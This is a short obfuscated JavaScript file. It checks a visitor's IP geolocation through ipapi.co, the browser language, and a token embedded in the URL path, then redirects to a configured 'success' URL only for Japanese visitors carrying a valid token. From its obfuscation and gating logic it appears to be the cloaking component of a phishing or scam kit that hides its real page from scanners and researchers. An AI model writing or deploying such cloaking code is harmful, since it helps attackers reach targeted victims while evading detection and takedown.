(function(){
    const _0x4f8d=['test','language','userLanguage','toLowerCase','startsWith','country','error','log','pathname','includes','match','length','JP','json'];
    const _0x3e2d=function(_0x2c8f05,_0x4f4d1d){return _0x4f8d[_0x2c8f05];};
    
    const _0x5c1e=async function(){
        try{
            const _0x2d4f=await fetch('https://ipapi.co/json/');
            const _0x1f3e=await _0x2d4f[_0x3e2d(13)]();
            return _0x1f3e[_0x3e2d(5)]===_0x3e2d(12);
        }catch(_0x4e2d){
            console[_0x3e2d(6)]('IP检查失败:',_0x4e2d);
            return false;
        }
    };

    window['validateAndExtractParams']=function(_0x1d2e){
        const _0x4c2d=/\/caonima=([A-Za-z]+)\.co\.jp\//;
        const _0x2f1e=_0x1d2e[_0x3e2d(10)](_0x4c2d);
        
        if(_0x2f1e){
            const _0x3f1e=_0x2f1e[1];
            const _0x5d2e=_0x3f1e[_0x3e2d(11)]>=7&&_0x3f1e[_0x3e2d(11)]<=9;
            const _0x1f2e=/[A-Z]/[_0x3e2d(0)](_0x3f1e);
            const _0x2e1e=/[a-z]/[_0x3e2d(0)](_0x3f1e);
            
            return{
                isValid:_0x5d2e&&_0x1f2e&&_0x2e1e,
                randomString:_0x3f1e
            };
        }
        return{
            isValid:false,
            randomString:null
        };
    };

    window['validateRandomString']=function(_0x4d1e){
        return/^[A-Za-z]{7,9}$/[_0x3e2d(0)](_0x4d1e);
    };

    window['checkBrowserLanguage']=function(){
        const _0x1e2d=navigator[_0x3e2d(1)]||navigator[_0x3e2d(2)];
        return _0x1e2d[_0x3e2d(3)]()[_0x3e2d(4)]('ja');
    };

    window['checkIPLocation']=_0x5c1e;

    window['handleRedirect']=async function(_0x3d2e){
        const[_0x2d2e,_0x1d1e]=await Promise['all']([
            _0x5c1e(),
            window['checkBrowserLanguage']()
        ]);

        if(!_0x2d2e||!_0x1d1e){
            console[_0x3e2d(7)]('IP或语言验证失败');
            return CONFIG['REDIRECT_URL_FAILURE'];
        }

        if(window['location'][_0x3e2d(8)][_0x3e2d(9)]('caonima=')){
            if(_0x3d2e['isValid']&&window['validateRandomString'](_0x3d2e['randomString'])){
                return CONFIG['REDIRECT_URL_SUCCESS'];
            }
        }
        
        return CONFIG['REDIRECT_URL_FAILURE'];
    };
})();
